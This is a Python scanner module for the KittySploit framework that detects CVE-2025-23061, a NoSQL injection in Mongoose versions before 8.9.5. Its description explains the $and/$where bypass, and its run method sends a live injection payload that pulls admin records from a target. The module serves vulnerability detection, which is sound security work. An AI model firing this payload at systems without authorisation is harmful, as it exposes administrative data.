#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NoSQL injection vulnerability in Mongoose < 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mongoose - NoSQL Injection Detection',
        'description': "NoSQL injection vulnerability in Mongoose < 8.9.5 affecting the populate() function's match option. This vulnerability exists due to an incomplete fix for CVE-2024-53900. While direct $where injection is blocked, attackers can bypass this protection by nesting $where operators within logical operators like $and, allowing execution of arbitrary JavaScript code on MongoDB server, bypassing authentication, and accessing sensitive administrative data.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'nosql', 'mongoose', 'nodejs', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc',
            'https://github.com/Automattic/mongoose/releases/tag/8.9.5',
            'https://github.com/NamhyeonKo/mongoose-cve-lab',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-23061',
        ],
        'cve': 'CVE-2025-23061',
    }

    def run(self):
        path = '/posts?authorMatch={"$and":[{"$where":"this.isAdmin"}]}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('"isAdmin":true', '"title":', '"username":',)
        ctype_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='critical',
                reason='Mongoose - NoSQL Injection detected',
                path=path,
            )
            return True
        return False

